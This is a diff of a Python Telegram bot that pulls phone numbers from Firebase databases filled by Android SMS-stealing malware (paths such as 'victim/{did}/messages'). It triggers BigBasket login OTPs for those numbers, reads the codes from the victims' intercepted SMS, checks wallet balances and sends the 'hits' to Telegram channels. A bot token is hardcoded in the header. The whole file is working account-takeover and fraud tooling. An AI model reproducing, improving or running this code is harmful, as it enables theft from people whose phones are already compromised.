@@ -1,18 +1,17 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-BigBasket Enterprise Bulk Scanner & Auto-OTP Telegram Bot — Complete Engine
+BigBasket Enterprise Bulk Scanner & Auto-OTP Telegram Bot — Jio-Bot Architecture
 Bot Token: 8538201990:AAGdZy3HmD3nja50DlHNInJXJHL6uIpdkGc (@mangerbot2423bot)
 
-Full Jio-Bot Architecture Replication & Platform Upgrades:
-- Multi-Threaded Engine: 5 concurrent scan workers for high-speed bulk checking.
-- Channel Logs & Storage: Live Hit cards and final backup files broadcast to Telegram channels.
-- Full Panel Manager (/panels): View, add, delete, ping health, and scan panels with inline buttons.
-- Direct Paste Recognition: Paste any Firebase RTDB URL directly to add or scan immediately.
-- Instant 1.8s Fast Online Harvester: Harvests 100% of live online devices without per-device HTTP stalls.
-- Transparent Result Categorization: Separates Hits (> ₹0), Zero Balance, Unregistered Numbers, and Offline Devices.
-- Safe Telegram UI: Strict HTML entity escaping (esc) and flood-control throttled progress bar.
-- Direct DM Report Exporter: Automatically sends final BB_HITS_*.txt report via bot.send_document.
+Key Features (Jio-Bot Equivalent):
+- ⚡ Scanner Hub: Start, Stop, Resume, Live Status with Progress Bar & ETA
+- 📂 Panels & Data Hub: Add, View, Delete, Ping & Batch Scan Firebase RTDB Panels
+- 📡 Channels & Logs Hub: Custom Log & Storage Channels with Live Test Pings
+- 📥 Export Hub: Download Latest Hits Report directly in Telegram DM
+- 📱 Single Check: Instant 1-on-1 Number Verification with Wallet & NeuCoins Breakdown
+- 🔄 24/7 Render Keep-Alive: Embedded HTTP Server & Self-Ping Loop (0% Inactivity Sleep)
+- 💾 Auto-Recovery: Interrupted Scan State Persistence — Resume right where it stopped
 """
 
 import os
@@ -78,6 +77,8 @@ BB_MEMBER_URL = f"{BB_API}/ui-svc/v1/member/details"
 BB_DEV_REG = f"{BB_API}/mapi/v4.2.0/register/device/"
 BB_UI_URL = f"{BB_API}/ui-svc/v2/header/?send_door_info=true&app_launch=true"
 
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+
 # Global state
 user_sessions: Dict[int, dict] = {}
 session_lock = threading.Lock()
@@ -87,13 +88,15 @@ scan_lock = threading.Lock()
 # Persistent configuration
 PANELS_FILE = os.path.join(CONFIG_DIR, "panels.json")
 CHANNELS_FILE = os.path.join(CONFIG_DIR, "channels.json")
+STORAGE_CHANNELS_FILE = os.path.join(CONFIG_DIR, "storage_channels.json")
 
 user_panels: Dict[int, List[str]] = {}
 user_channels: Dict[int, str] = {}
+user_storage_channels: Dict[int, str] = {}
 cfg_lock = threading.Lock()
 
 def load_configs():
-    global user_panels, user_channels
+    global user_panels, user_channels, user_storage_channels
     with cfg_lock:
         if os.path.exists(PANELS_FILE):
             try:
@@ -107,6 +110,12 @@ def load_configs():
                     user_channels = {int(k): str(v) for k, v in json.load(f).items()}
             except Exception:
                 pass
+        if os.path.exists(STORAGE_CHANNELS_FILE):
+            try:
+                with open(STORAGE_CHANNELS_FILE, "r", encoding="utf-8") as f:
+                    user_storage_channels = {int(k): str(v) for k, v in json.load(f).items()}
+            except Exception:
+                pass
 
 def save_configs():
     with cfg_lock:
@@ -115,10 +124,37 @@ def save_configs():
                 json.dump({str(k): v for k, v in user_panels.items()}, f, indent=2)
             with open(CHANNELS_FILE, "w", encoding="utf-8") as f:
                 json.dump({str(k): v for k, v in user_channels.items()}, f, indent=2)
+            with open(STORAGE_CHANNELS_FILE, "w", encoding="utf-8") as f:
+                json.dump({str(k): v for k, v in user_storage_channels.items()}, f, indent=2)
         except Exception:
             pass
 
 load_configs()
+
+def get_effective_log_channel(chat_id: int) -> str:
+    with cfg_lock:
+        return user_channels.get(chat_id, DEFAULT_LOG_CHANNEL)
+
+def get_effective_storage_channel(chat_id: int) -> str:
+    with cfg_lock:
+        return user_storage_channels.get(chat_id, DEFAULT_STORAGE_CHANNEL)
+
+def esc(text: Any) -> str:
+    if text is None:
+        return ""
+    return html.escape(str(text), quote=False)
+
+def normalize_phone(raw: Any) -> Optional[str]:
+    if not raw:
+        return None
+    s = re.sub(r"\D", "", str(raw))
+    if len(s) == 12 and s.startswith("91"):
+        s = s[2:]
+    elif len(s) == 11 and s.startswith("0"):
+        s = s[1:]
+    if len(s) == 10 and s[0] in "6789":
+        return s
+    return None
 
 # ============ SCAN STATE PERSISTENCE & AUTO-RECOVERY ============
 def get_state_file(chat_id: int) -> str:
@@ -198,7 +234,7 @@ class RenderHealthHandler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(json.dumps(resp).encode("utf-8"))
 
     def log_message(self, format, *args):
-        pass  # Suppress request spam in stdout
+        pass
 
 def start_render_health_server():
     port = int(os.environ.get("PORT", "8080"))
@@ -216,52 +252,74 @@ def start_render_health_server():
     t.start()
 
 def start_render_self_ping():
-    ext_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("KEEP_ALIVE_URL")
+    ext_url = os.environ.get("KEEP_ALIVE_URL") or os.environ.get("RENDER_EXTERNAL_URL")
     if not ext_url:
-        print("ℹ️ [Render 24/7] No RENDER_EXTERNAL_URL specified. Self-ping loop idle.")
         return
 
     def ping_loop():
         url = f"{ext_url.rstrip('/')}/health"
         print(f"💓 [Render 24/7] Self-ping active! Pinging {url} every 9 minutes...")
         while True:
-            time.sleep(540)  # Ping every 9 minutes to guarantee 0 downtime on Render
+            time.sleep(540)
             try:
-                r = requests.get(url, timeout=15)
+                requests.get(url, timeout=15)
             except Exception:
                 pass
 
     t = threading.Thread(target=ping_loop, daemon=True)
     t.start()
 
+# ============ TELEGRAM SAFE MESSAGING ============
+def safe_send(chat_id: int, text: str, reply_markup=None):
+    try:
+        truncated = text[:4000] if len(text) > 4000 else text
+        return bot.send_message(chat_id, truncated, reply_markup=reply_markup, disable_web_page_preview=True)
+    except Exception:
+        try:
+            plain = re.sub(r"<[^>]+>", "", text)
+            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
+            return bot.send_message(chat_id, plain_trunc, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
+        except Exception:
+            return None
 
-def get_effective_channel(chat_id: int) -> Optional[str]:
-    with cfg_lock:
-        return user_channels.get(chat_id, DEFAULT_LOG_CHANNEL)
+def safe_edit(chat_id: int, message_id: int, text: str, reply_markup=None):
+    try:
+        truncated = text[:4000] if len(text) > 4000 else text
+        bot.edit_message_text(truncated, chat_id, message_id, reply_markup=reply_markup, disable_web_page_preview=True)
+    except Exception as e:
+        if "message is not modified" in str(e).lower():
+            return
+        try:
+            plain = re.sub(r"<[^>]+>", "", text)
+            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
+            bot.edit_message_text(plain_trunc, chat_id, message_id, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
+        except Exception:
+            pass
 
-def esc(text: Any) -> str:
-    """Escapes HTML special characters to prevent Telegram entity parse errors."""
-    if text is None:
-        return ""
-    return html.escape(str(text), quote=False)
+def send_or_edit(chat_id: int, text: str, reply_markup=None, message_id: Optional[int] = None):
+    if message_id:
+        try:
+            safe_edit(chat_id, message_id, text, reply_markup=reply_markup)
+            return
+        except Exception:
+            pass
+    safe_send(chat_id, text, reply_markup=reply_markup)
 
-def normalize_phone(raw: Any) -> Optional[str]:
-    """Extract clean 10-digit Indian mobile number."""
-    if not raw:
-        return None
-    s = re.sub(r"[^\d]", "", str(raw))
-    if len(s) == 10 and s[0] in "6789":
-        return s
-    if len(s) == 11 and s.startswith("0") and s[1] in "6789":
-        return s[1:]
-    if len(s) == 12 and s.startswith("91") and s[2] in "6789":
-        return s[2:]
-    if len(s) == 13 and s.startswith("091") and s[3] in "6789":
-        return s[3:]
-    m = re.search(r"([6-9]\d{9})", s)
-    return m.group(1) if m else None
+def broadcast_hit_to_channels(hit_card: str, chat_id: int):
+    channels = set()
+    log_ch = get_effective_log_channel(chat_id)
+    if log_ch:
+        channels.add(log_ch)
+    if DEFAULT_LOG_CHANNEL:
+        channels.add(DEFAULT_LOG_CHANNEL)
 
-# ============ BIGBASKET NATIVE CLIENT ============
+    for ch in channels:
+        try:
+            safe_send(int(ch) if str(ch).lstrip("-").isdigit() else ch, hit_card)
+        except Exception:
+            pass
+
+# ============ BIGBASKET CLIENT ============
 class BigBasketClient:
     def __init__(self):
         self.s = cffi_requests.Session(impersonate="chrome120")
@@ -459,12 +517,11 @@ CANDIDATE_PATHS = [
     "clients/{did}/sms",
     "devices/{did}/messages",
     "devices/{did}/sms",
-    "all_sms/{did}",
-    "smsList/{did}"
+    "users/{did}/messages",
+    "victim/{did}/messages"
 ]
 
 def resolve_firebase_url(panel_or_url: str) -> Optional[str]:
-    """Resolves short panel names into full RTDB endpoints with caching."""
     if not panel_or_url:
         return None
     s = panel_or_url.strip().rstrip("/")
@@ -495,7 +552,6 @@ def resolve_firebase_url(panel_or_url: str) -> Optional[str]:
     return fallback
 
 def extract_bb_otp(text: str, sender: str) -> Optional[str]:
-    """Extracts BigBasket login OTP from SMS message body and sender headers."""
     if not text:
         return None
     combined = f"{sender} {text}".lower()
@@ -509,22 +565,18 @@ def extract_bb_otp(text: str, sender: str) -> Optional[str]:
     if not (is_bb or has_otp_kw):
         return None
 
-    # Pattern 1: Digits after keywords: "Bigbasket login code: 704651" / "OTP: 123456"
     m = re.search(r"(?:otp|code|is|pin|login|verification)[\s\S]{0,25}?\b([0-9]{4,6})\b", text, re.I)
     if m:
         return m.group(1)
 
-    # Pattern 2: Digits before keywords: "704651 is your BigBasket OTP"
     m_before = re.search(r"\b([0-9]{4,6})\b\s*(?:is\s*(?:your|the)\s*)?(?:otp|code|verification|login|secret)", text, re.I)
     if m_before:
         return m_before.group(1)
 
-    # Pattern 3: Dash-separated: 123-456
     m_dash = re.search(r"\b([0-9]{3})-([0-9]{3})\b", text)
     if m_dash:
         return f"{m_dash.group(1)}{m_dash.group(2)}"
 
-    # Pattern 4: Fallback if sender or body is explicitly BigBasket
     if is_bb:
         m_6 = re.search(r"\b([0-9]{6})\b", text)
         if m_6:
@@ -535,7 +587,6 @@ def extract_bb_otp(text: str, sender: str) -> Optional[str]:
     return None
 
 def find_working_device_path(clean_url: str, did: str) -> str:
-    """Finds and caches which Firebase path stores SMS for this device across APK variants."""
     cache_key = f"{clean_url}:{did}"
     with cache_lock:
         if cache_key in DEVICE_PATH_CACHE:
@@ -559,7 +610,6 @@ def find_working_device_path(clean_url: str, did: str) -> str:
     return default_path
 
 def fetch_existing_message_keys(fb_url: str, did: str) -> Set[str]:
-    """Fetches already present message IDs prior to sending OTP so older messages are skipped."""
     known = set()
     clean_url = fb_url.rstrip("/")
     active_path = find_working_device_path(clean_url, did)
@@ -580,7 +630,6 @@ def watch_device_otp(
     timeout_sec: int = 40,
     stop_checker: Optional[Callable[[], bool]] = None
 ) -> Optional[str]:
-    """Watches Firebase RTDB messages for incoming BigBasket OTP (aborts instantly if stop requested)."""
     if not fb_url or not did:
         return None
     clean_url = fb_url.rstrip("/")
@@ -599,10 +648,8 @@ def watch_device_otp(
                 for mk, item in reversed(list(data.items())):
                     if str(mk) in known_keys or not isinstance(item, dict):
                         continue
-                    
                     text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
                     sender = str(item.get("sender") or item.get("phone") or item.get("address") or "").upper()
-                    
                     otp = extract_bb_otp(text, sender)
                     if otp:
                         return otp
@@ -611,93 +658,176 @@ def watch_device_otp(
         time.sleep(2.0)
     return None
 
+# ============ JIO-BOT EQUIVALENT ONLINE & SIM AUDITOR ============
 def is_device_online(data: Any) -> bool:
+    """Robust online detector matching Jio-Automation engine."""
     if not isinstance(data, dict):
         return False
+
     candidates = [data]
-    for sub in ("info", "deviceInfo", "device_info", "details", "client", "system"):
-        if isinstance(data.get(sub), dict):
-            candidates.append(data.get(sub))
+    for sub_k in ("info", "deviceInfo", "device_info", "details", "client", "system"):
+        sub = data.get(sub_k)
+        if isinstance(sub, dict):
+            candidates.append(sub)
+
     for c in candidates:
-        st = c.get("status")
-        if st is not None:
-            if st is True or str(st).lower() in ("online", "true", "1", "active"):
+        raw_status = (
+            c.get("status")
+            if c.get("status") is not None
+            else c.get("isOnline")
+            if c.get("isOnline") is not None
+            else c.get("online")
+            if c.get("online") is not None
+            else c.get("state")
+            if c.get("state") is not None
+            else c.get("connected")
+        )
+        if raw_status is not None:
+            if raw_status is True or raw_status == 1 or raw_status == "1" or str(raw_status).strip().lower() in ("online", "true", "active", "connected", "1"):
                 return True
-            if st is False or str(st).lower() in ("offline", "false", "0"):
+            if raw_status is False or raw_status == 0 or raw_status == "0" or str(raw_status).strip().lower() in ("offline", "false", "disconnected", "0"):
                 return False
+
     now = time.time()
     for c in candidates:
-        for ts_k in ("timestamp", "last_seen", "lastSeen", "time", "updated_at"):
-            val = c.get(ts_k)
+        for ts_field in ("timestamp", "last_seen", "lastSeen", "lastOnline", "lastMessageTime", "time", "updated_at"):
+            val = c.get(ts_field)
+            if isinstance(val, dict):
+                val = val.get("timestamp") or val.get("time")
             if val:
                 try:
-                    t_val = float(val)
-                    if t_val > 1e11:
-                        t_val /= 1000.0
-                    if -180 <= (now - t_val) <= 900:
+                    t_float = float(val)
+                    if t_float > 1e12:
+                        t_float /= 1000.0
+                    diff = now - t_float
+                    if -180 <= diff <= 900:
                         return True
                 except Exception:
                     pass
-    return False
+
+    # If neither explicit offline nor timestamp, do not drop device (keep as potentially active)
+    return True
 
 def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str) -> List[Dict[str, Any]]:
-    """Fast in-memory audit of both SIM 1 & SIM 2 on the device."""
     targets = []
     seen = set()
     dev_name = dev_data.get("modelName") or dev_data.get("model") or dev_data.get("device") or "Android Device"
 
-    # 1. Inspect sims container
-    sim_container = dev_data.get("sims") or dev_data.get("simInfo") or dev_data.get("simList")
-    if isinstance(sim_container, dict):
-        sim_container = list(sim_container.values())
+    candidates = [dev_data]
+    for sub_k in ("info", "deviceInfo", "device_info", "details", "system", "client"):
+        sub = dev_data.get(sub_k)
+        if isinstance(sub, dict):
+            candidates.append(sub)
 
-    if isinstance(sim_container, list) and len(sim_container) > 0:
-        for idx, s in enumerate(sim_container):
-            if isinstance(s, dict):
-                carrier = s.get("carrierName") or s.get("carrier") or s.get("operator") or dev_data.get("service_provider") or "SIM"
-                slot_idx = s.get("simSlotIndex") or s.get("slot") or idx
-                slot_num = int(slot_idx) + 1 if str(slot_idx).isdigit() else (idx + 1)
-                raw_num = s.get("phoneNumber") or s.get("number") or s.get("phone") or s.get("mobNo")
-                num = normalize_phone(raw_num)
-                
+    for c in candidates:
+        # 1. Direct phone keys
+        for k in (
+            "phoneNumber", "phone", "phone_number", "mobNo", "mobile", "number",
+            "sim1", "sim_1", "sim2", "sim_2", "simNumber", "sim1Number", "sim2Number",
+            "sim_number", "line1Number", "line1_number", "telephone"
+        ):
+            val = c.get(k)
+            if val:
+                num = normalize_phone(val)
                 if num and num not in seen:
                     seen.add(num)
+                    slot_title = "Hardware SIM Slot 1" if "1" in k or k in ("mobNo", "phoneNumber", "phone", "mobile") else "Hardware SIM Slot 2"
                     targets.append({
                         "phone": num,
                         "device": dev_name,
                         "dev_id": did,
                         "panel": fb_url,
                         "panel_name": panel_ref,
-                        "slot": f"Hardware SIM Slot {slot_num} ({carrier})",
+                        "slot": slot_title,
                         "is_physical_sim": True
                     })
 
-    # 2. Check root phone keys
-    for k in ("mobNo", "phoneNumber", "phone", "mobile", "sim1", "sim2"):
-        val = dev_data.get(k)
-        if val:
-            num = normalize_phone(val)
-            if num and num not in seen:
-                seen.add(num)
-                slot_title = "Hardware SIM Slot 1" if "1" in k or k in ("mobNo", "phoneNumber", "phone", "mobile") else "Hardware SIM Slot 2"
-                targets.append({
-                    "phone": num,
-                    "device": dev_name,
-                    "dev_id": did,
-                    "panel": fb_url,
-                    "panel_name": panel_ref,
-                    "slot": slot_title,
-                    "is_physical_sim": True
-                })
+        # 2. sims / simInfo containers
+        for sim_key in ("sims", "simInfo", "sim_info", "simList", "sim_list"):
+            sim_container = c.get(sim_key)
+            if isinstance(sim_container, str):
+                try:
+                    sim_container = json.loads(sim_container)
+                except Exception:
+                    pass
+            if isinstance(sim_container, dict):
+                sim_container = list(sim_container.values())
+
+            if isinstance(sim_container, list):
+                for idx, s in enumerate(sim_container):
+                    if isinstance(s, dict):
+                        carrier = s.get("carrierName") or s.get("carrier") or s.get("operator") or s.get("simOperatorName") or "SIM"
+                        slot_idx = s.get("simSlotIndex") or s.get("slot") or idx
+                        slot_num = int(slot_idx) + 1 if str(slot_idx).isdigit() else (idx + 1)
+                        for sk in ("phoneNumber", "phone", "number", "simNumber", "line1Number"):
+                            raw_num = s.get(sk)
+                            num = normalize_phone(raw_num)
+                            if num and num not in seen:
+                                seen.add(num)
+                                targets.append({
+                                    "phone": num,
+                                    "device": dev_name,
+                                    "dev_id": did,
+                                    "panel": fb_url,
+                                    "panel_name": panel_ref,
+                                    "slot": f"Hardware SIM Slot {slot_num} ({carrier})",
+                                    "is_physical_sim": True
+                                })
 
     return targets
 
+def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], int, Optional[str]]:
+    fb_url = resolve_firebase_url(raw_panel)
+    if not fb_url:
+        return [], 0, "Invalid Firebase URL"
+    clean_url = fb_url.rstrip("/")
+    devices_dict = None
+
+    candidate_paths = ["clients.json", "devices.json", "client.json", "device.json", "users.json", "victim.json", "all_user.json"]
+    for p in candidate_paths:
+        try:
+            r = requests.get(f"{clean_url}/{p}", timeout=6)
+            if r.status_code == 200 and isinstance(r.json(), dict) and r.json():
+                devices_dict = r.json()
+                break
+        except Exception:
+            pass
+
+    if not devices_dict:
+        try:
+            r_root = requests.get(f"{clean_url}/.json?shallow=true", timeout=6)
+            if r_root.status_code == 200 and isinstance(r_root.json(), dict):
+                for k in r_root.json().keys():
+                    k_str = str(k).lower()
+                    if any(x in k_str for x in ("client", "device", "victim", "user", "sms")):
+                        r_sub = requests.get(f"{clean_url}/{k}.json", timeout=6)
+                        if r_sub.status_code == 200 and isinstance(r_sub.json(), dict) and r_sub.json():
+                            devices_dict = r_sub.json()
+                            break
+        except Exception:
+            pass
+
+    if not devices_dict:
+        return [], 0, "Database locked, deactivated, or empty"
+
+    all_count = len(devices_dict)
+    online_targets = []
+    seen_nums = set()
+
+    for did, dev_data in devices_dict.items():
+        if not isinstance(dev_data, dict):
+            continue
+        if is_device_online(dev_data):
+            dev_targets = audit_device_sim_slots(str(did), dev_data, fb_url, raw_panel)
+            for t in dev_targets:
+                if t["phone"] not in seen_nums:
+                    seen_nums.add(t["phone"])
+                    online_targets.append(t)
+
+    return online_targets, all_count, None
+
 # ============ SCRAPED FILE PARSER ============
 def parse_scraped_file(filepath_or_content: str, fallback_panel: str = "") -> List[Dict[str, Any]]:
-    """
-    Parses clean_numbers_*.txt / all_panels_*.txt / bulk_scrape_*.txt / .csv files.
-    Extracts complete bridge mapping: phone, dev_id, panel, slot, device.
-    """
     content = filepath_or_content
     if os.path.exists(filepath_or_content):
         try:
@@ -710,176 +840,55 @@ def parse_scraped_file(filepath_or_content: str, fallback_panel: str = "") -> Li
     targets = []
     seen = set()
 
-    # Format 1: CSV format
     if "," in content and ("Phone Number" in content or "Device ID" in content or "Firebase" in content):
         try:
             reader = csv.DictReader(io.StringIO(content))
             for row in reader:
-                is_caller = any("caller" in str(v).lower() or "alert" in str(v).lower() for k, v in row.items() if "type" in k.lower() or "source" in k.lower() or "slot" in k.lower())
-                rec_otp = any("yes" in str(v).lower() for k, v in row.items() if "otp" in k.lower())
                 raw_num = row.get("Phone Number") or row.get("Raw Number") or row.get("phone") or row.get("number")
-                m_num = re.search(r"([6-9]\d{9})", str(raw_num))
-                if m_num and (rec_otp or not is_caller):
-                    num = m_num.group(1)
-                    if num not in seen:
-                        seen.add(num)
-                        did = row.get("Device ID") or row.get("deviceId") or ""
-                        pnl = row.get("Firebase URL") or row.get("Firebase DB") or row.get("panel") or fallback_panel
-                        dname = row.get("Device Name") or row.get("model") or "Device"
-                        targets.append({
-                            "phone": num,
-                            "device": dname.strip(),
-                            "dev_id": did.strip(),
-                            "panel": resolve_firebase_url(pnl.strip()),
-                            "panel_name": pnl.strip(),
-                            "slot": "Hardware SIM",
-                            "is_physical_sim": True
-                        })
+                num = normalize_phone(raw_num)
+                if num and num not in seen:
+                    seen.add(num)
+                    did = row.get("Device ID") or row.get("deviceId") or ""
+                    pnl = row.get("Firebase URL") or row.get("Firebase DB") or row.get("panel") or fallback_panel
+                    dname = row.get("Device Name") or row.get("model") or "Device"
+                    targets.append({
+                        "phone": num,
+                        "device": dname.strip(),
+                        "dev_id": did.strip(),
+                        "panel": resolve_firebase_url(pnl.strip()),
+                        "panel_name": pnl.strip(),
+                        "slot": "Hardware SIM",
+                        "is_physical_sim": True
+                    })
+            if targets:
+                return targets
         except Exception:
             pass
 
-    # Format 2: Bridge line format in Section [A]:
-    line_matches = re.findall(
-        r"([6-9]\d{9})\s*\|\s*did:([^\s|]+)\s*\|\s*panel:([^\s|]+)(?:\s*\|\s*dev:([^\n|]+))?",
-        content
-    )
-    for num, did, pnl, dname in line_matches:
-        num = num.strip()
-        if num not in seen:
-            seen.add(num)
-            targets.append({
-                "phone": num,
-                "device": (dname or "Device").strip(),
-                "dev_id": did.strip(),
-                "panel": resolve_firebase_url(pnl.strip()),
-                "panel_name": pnl.strip(),
-                "slot": "Hardware SIM",
-                "is_physical_sim": True
-            })
-
-    # Format 3: Detailed card blocks in Section 1:
-    card_matches = re.findall(
-        r"📱\s*([6-9]\d{9})[\s\S]*?•\s*Device:\s*([^\n]+)[\s\S]*?•\s*Dev ID:\s*([^\n]+)[\s\S]*?•\s*Panel:\s*([^\n]+)[\s\S]*?•\s*Slot:\s*([^\n]+)",
-        content
-    )
-    for num, dev, did, pnl, slot in card_matches:
-        num = num.strip()
-        if num not in seen:
-            seen.add(num)
-            targets.append({
-                "phone": num,
-                "device": dev.strip(),
-                "dev_id": did.strip(),
-                "panel": resolve_firebase_url(pnl.strip()),
-                "panel_name": pnl.strip(),
-                "slot": slot.strip(),
-                "is_physical_sim": True
-            })
-
-    # Format 4: Multi-panel block format:
-    all_pnl_matches = re.findall(
-        r"([6-9]\d{9})\s*\nDevice:\s*([^\n(]+)\s*\(([^)]+)\)[\s\S]*?Firebase:\s*([^\n]+)",
-        content
-    )
-    for num, dev, did, pnl in all_pnl_matches:
-        num = num.strip()
-        if num not in seen:
-            seen.add(num)
-            targets.append({
-                "phone": num,
-                "device": dev.strip(),
-                "dev_id": did.strip(),
-                "panel": resolve_firebase_url(pnl.strip()),
-                "panel_name": pnl.strip(),
-                "slot": "Hardware SIM",
-                "is_physical_sim": True
-            })
-
-    # Format 5: Raw numbers fallback
-    if not targets:
-        m_sec_a = re.search(r">>> \[A\] PHYSICAL SIMS[^\n]*\n([\s\S]*?)(?:>>>|━━━━━━━━|\Z)", content)
-        raw_nums = re.findall(r"\b([6-9]\d{9})\b", m_sec_a.group(1)) if m_sec_a else re.findall(r"\b([6-9]\d{9})\b", content)
-        for num in raw_nums:
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        m = re.search(r"\b([6-9]\d{9})\b", line)
+        if m:
+            num = m.group(1)
             if num not in seen:
                 seen.add(num)
+                m_dev = re.search(r"dev(?:ice)?[:=\s]+([a-zA-Z0-9_\-]+)", line, re.I)
+                did = m_dev.group(1) if m_dev else ""
+                m_pnl = re.search(r"(https?://[^\s|,]+)", line)
+                pnl = m_pnl.group(1) if m_pnl else fallback_panel
                 targets.append({
                     "phone": num,
-                    "device": "Imported Number",
-                    "dev_id": "",
-                    "panel": resolve_firebase_url(fallback_panel) if fallback_panel else "",
-                    "panel_name": fallback_panel or "",
-                    "slot": "Physical SIM",
+                    "device": "Scraped Target",
+                    "dev_id": did,
+                    "panel": resolve_firebase_url(pnl) if pnl else "",
+                    "panel_name": pnl,
+                    "slot": "Hardware SIM",
                     "is_physical_sim": True
                 })
 
     return targets
-
-# ============ TELEGRAM BOT INITIALIZATION & SAFE WRAPPERS ============
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
-
-def safe_send(chat_id: int, text: str, reply_markup=None):
-    """Safely sends a message with fallback to plain text if HTML entity parsing fails."""
-    try:
-        truncated = text[:4000] if len(text) > 4000 else text
-        return bot.send_message(chat_id, truncated, reply_markup=reply_markup, disable_web_page_preview=True)
-    except Exception as e:
-        try:
-            plain = re.sub(r"<[^>]+>", "", text)
-            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
-            return bot.send_message(chat_id, plain_trunc, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
-        except Exception:
-            return None
-
-def safe_edit(chat_id: int, message_id: int, text: str, reply_markup=None):
-    """Safely edits a message with flood-control and plain-text fallback."""
-    try:
-        truncated = text[:4000] if len(text) > 4000 else text
-        bot.edit_message_text(truncated, chat_id, message_id, reply_markup=reply_markup, disable_web_page_preview=True)
-    except Exception:
-        try:
-            plain = re.sub(r"<[^>]+>", "", text)
-            plain_trunc = plain[:4000] if len(plain) > 4000 else plain
-            bot.edit_message_text(plain_trunc, chat_id, message_id, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
-        except Exception:
-            pass
-
-def broadcast_hit_to_channels(hit_card: str, chat_id: int):
-    """Broadcasts hit cards to both user log channel and master storage channel."""
-    channels = set()
-    user_ch = get_effective_channel(chat_id)
-    if user_ch:
-        channels.add(user_ch)
-    if DEFAULT_LOG_CHANNEL:
-        channels.add(DEFAULT_LOG_CHANNEL)
-
-    for ch in channels:
-        try:
-            safe_send(int(ch) if str(ch).lstrip("-").isdigit() else ch, hit_card)
-        except Exception:
-            pass
-
-def main_keyboard():
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add(
-        types.KeyboardButton("🌐 Direct Firebase Panel Scan"),
-        types.KeyboardButton("📁 Upload Scraped File"),
-        types.KeyboardButton("⚙️ Panel Manager"),
-        types.KeyboardButton("📢 Channel Settings"),
-        types.KeyboardButton("📱 Check Single Number"),
-        types.KeyboardButton("📊 View Latest Hits"),
-        types.KeyboardButton("ℹ️ Help / Commands")
-    )
-    return markup
-
-def cancel_keyboard():
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add(types.KeyboardButton("❌ Cancel"))
-    return markup
-
-def stop_scan_keyboard():
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🛑 Stop Scan & Download Report", callback_data="stop_current_scan"))
-    return markup
 
 # ============ MULTI-THREADED SCAN ENGINE ============
 def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str = "BigBasket Bulk Scan", resume_data: Optional[Dict[str, Any]] = None):
@@ -936,6 +945,9 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
 
     with_device = sum(1 for t in targets_to_run if t.get("dev_id") and t.get("panel"))
 
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🛑 Stop Scan & Get Report", callback_data="stop_current_scan"))
+
     start_msg_text = (
         f"▶️ <b>Resuming {esc(scan_title)}!</b>\n\n"
         f"📋 <b>Remaining to Scan:</b> <code>{len(targets_to_run)}/{total}</code> SIMs\n"
@@ -950,7 +962,7 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         f"⏳ Initializing workers & sending OTPs in parallel..."
     )
 
-    prog_msg = safe_send(chat_id, start_msg_text, reply_markup=stop_scan_keyboard())
+    prog_msg = safe_send(chat_id, start_msg_text, reply_markup=markup)
     prog_id = prog_msg.message_id if prog_msg else None
     last_edit_time = [0.0]
     update_lock = threading.Lock()
@@ -961,7 +973,7 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
             if not state or not prog_id:
                 return
             now_ts = time.time()
-            if now_ts - last_edit_time[0] < 2.2:
+            if now_ts - last_edit_time[0] < 2.5:
                 return
             last_edit_time[0] = now_ts
 
@@ -978,10 +990,10 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
                 f"📱 <b>Latest Active:</b> <code>+91 {esc(cur_phone)}</code>\n"
                 f"📟 <b>Device:</b> <code>{esc(cur_dev)}</code> ({esc(cur_slot)})\n"
                 f"🔥 <b>Hits Found:</b> <b>{h_count}</b> | ℹ️ <b>Zero Bal:</b> <b>{zb_count}</b>\n"
-                f"🏎️ <b>Workers:</b> <code>{MAX_SCAN_WORKERS} Active Parallel Threads</code>\n\n"
+                f"🏎️ <b>Workers:</b> <code>{MAX_SCAN_WORKERS} Parallel Threads</code>\n\n"
                 f"⏳ <i>Auto-capturing OTPs from Firebase & checking wallets...</i>"
             )
-            safe_edit(chat_id, prog_id, status_text, reply_markup=stop_scan_keyboard())
+            safe_edit(chat_id, prog_id, status_text, reply_markup=markup)
 
     def scan_single_target(item: Dict[str, Any]):
         with scan_lock:
@@ -1107,7 +1119,7 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
                 f"📟 <b>Device:</b> <code>{esc(dev_name)}</code> ({esc(slot)})\n"
                 f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"✅ <i>Saved to your final report!</i>"
+                f"✅ <i>Saved to report & broadcast to channels!</i>"
             )
             safe_send(chat_id, hit_card)
             broadcast_hit_to_channels(hit_card, chat_id)
@@ -1189,7 +1201,7 @@ def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str =
         f"⏳ <b>OTP Timeout:</b> <code>{len(timeout)}</code>\n\n"
